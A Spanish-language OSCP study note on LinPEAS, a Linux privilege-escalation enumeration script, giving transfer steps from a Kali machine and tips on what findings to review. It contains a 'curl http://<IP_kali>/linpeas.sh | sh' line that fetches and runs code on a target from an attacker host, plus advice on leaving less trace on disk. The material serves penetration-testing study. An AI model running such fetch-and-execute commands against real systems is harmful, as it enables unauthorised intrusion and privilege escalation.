---
tipo: tecnica
fase: privesc
so: linux
tags: [oscp, tecnica, privesc, linux]
fecha: 2026-10-08
---

# LinPEAS

> [!abstract] Qué es y cuándo usarla
> Script de enumeración automatizada de Linux (parte de PEASS-ng, análogo a winPEAS). Recorre el sistema buscando SUID/capabilities, cron jobs, permisos de ficheros, credenciales en procesos/historiales y mucho más, coloreando los hallazgos por severidad. Complementa — no sustituye — la enumeración manual.

## Requisitos previos
- Script descargado en Kali (paquete `peass` o repo PEASS-ng) y servidor HTTP para transferirlo, o descarga directa por `curl`/`wget` si el target tiene salida a internet.

## Pasos
```bash
# En Kali
python3 -m http.server 80
```
```bash
# En el objetivo
curl http://<IP_kali>/linpeas.sh | sh          # ejecución directa sin guardar en disco
# o
wget http://<IP_kali>/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

Revisar especialmente las secciones de SUID/SGID, capabilities, cron, `sudo -l`, y credenciales en ficheros/historiales/procesos.

> [!warning] Detección / problemas
> - Genera mucho ruido en disco/logs si se escribe el script; preferible `curl | sh` cuando hay salida a internet y no se necesita guardar el output.
> - Puede no detectar configuraciones muy custom (scripts propios, cron jobs ad-hoc) — seguir revisando a mano.
> - Puede ser detectado por AV/EDR en entornos reales endurecidos.

## Visto en
- Módulo: [[18 - Linux Privilege Escalation]]
- Relacionado: [[winPEAS]]
- Máquinas: [[]]
